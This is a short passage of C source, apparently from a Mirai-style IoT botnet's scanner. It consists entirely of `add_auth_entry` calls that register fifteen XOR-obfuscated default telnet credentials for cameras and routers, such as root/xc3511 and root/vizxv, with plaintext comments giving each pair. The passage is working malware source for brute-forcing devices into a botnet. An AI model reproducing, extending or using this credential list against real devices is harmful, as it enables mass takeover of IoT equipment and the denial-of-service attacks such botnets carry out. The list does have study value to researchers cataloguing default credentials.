...
void scanner_init(void)
{
    ...
    add_auth_entry("\x76\x6B\x6B\x70", "\x7C\x67\x37\x31\x35\x35", 9); // root xc3511
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x65\x60\x69\x6D\x6A", 9); // admin admin
    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x60\x61\x62\x65\x71\x68\x70", 9); // default default
    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x60\x69\x6D\x6A", 9); // root admin
    add_auth_entry("\x76\x6B\x6B\x70", "\x72\x6D\x7E\x7C\x72", 9); // root vizxv
    add_auth_entry("\x71\x77\x61\x76", "\x71\x77\x61\x76", 10); // user user
    add_auth_entry("\x63\x71\x61\x77\x70", "\x63\x71\x61\x77\x70", 10); // guest guest
    add_auth_entry("\x77\x71\x74\x74\x6B\x76\x70", "\x77\x71\x74\x74\x6B\x76\x70", 10); // support support
    add_auth_entry("\x76\x6B\x6B\x70", "\x3C\x3C\x3C\x3C\x3C\x3C", 10); // root 888888
    add_auth_entry("\x72\x77\x70\x65\x76\x67\x65\x69\x36\x34\x35\x31", "\x36\x34\x35\x31\x34\x32\x34\x36", 10); // vstarcam2015 20150602
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x6C\x44\x37\x36\x48\x71\x7D\x40", 10); // admin h@32LuyD
    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x6D\x74\x67\x37\x31\x35\x3C", 10); // root hipc3518
    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x77\x68\x73\x6D\x62\x6D\x67\x65\x69", 10); // root hslwificam
    add_auth_entry("\x76\x6B\x6B\x70", "\x31\x71\x74", 10); // root 5up
    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x6C\x6B\x30\x71\x6F\x71\x32\x65\x70", 10); // admin ho4uku6at
